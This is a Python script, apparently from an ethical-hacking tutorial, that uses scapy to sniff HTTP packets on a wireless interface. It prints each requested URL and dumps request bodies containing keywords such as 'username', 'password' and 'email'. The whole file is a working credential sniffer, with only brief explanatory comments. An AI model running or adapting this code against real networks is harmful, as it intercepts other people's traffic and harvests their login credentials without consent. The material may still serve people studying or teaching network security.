#!/usr/bin/env python3

# pip3 install scapy_http
import scapy.all as scapy
from scapy.layers import http  # to filter out the content sent over http


def sniff(interface):
    # store equals to false will make sniff not store the sniffed data into the memory
    # scapy.sniff(iface=interface, store=False,prn=process_sniffed_packet, filter="udp")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # prn gives is the callback function to which the sniffed data will be sent
    # filter will filter the unnecessary content from the packet
    # udp : to get the packets sent over udp (which is mostly used to send videos, audios and place phone calls since it is much faster than TCP)
    # instead of UDP we can write TCP , ARP or specific ports as well ("port 21") ("port 80")

def get_url(packet):
    return  packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path #host contains the main website URL and Path contains the path inside that website


def get_login_info (packet):
    if packet.haslayer(scapy.Raw):
            # this has the header and the rae url which has the username and the password
            # here scapy.Raw is the layer and "load" is the field in that layer
            load = packet[scapy.Raw].load
            username_keywords = ["username", "password",
                                 "email", "key", "user", "id", "login", "pass","uname"]
            for keyword in username_keywords:
                if keyword in str(load):  # since it is not necessary that all the websites will be sending their credentials using load field only
                    # print("\n\n[+] Possible username/password > ",load,"\n\n")
                    #break  # since if the load has more than one keyword it will print the load more than once
                    return load


def process_sniffed_packet(packet):
    # using HTTP since URLs images videos and passwords which is sent by a web browser is mostly sent by http layer
    # if our packet has a layer and the layer is a http request
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        print(packet)

        URL = get_url(packet)
        print("\n\n[+] HTTP Request >> ", URL)

        login_info=get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > ",login_info,"\n\n")

        

sniff("wlan0")
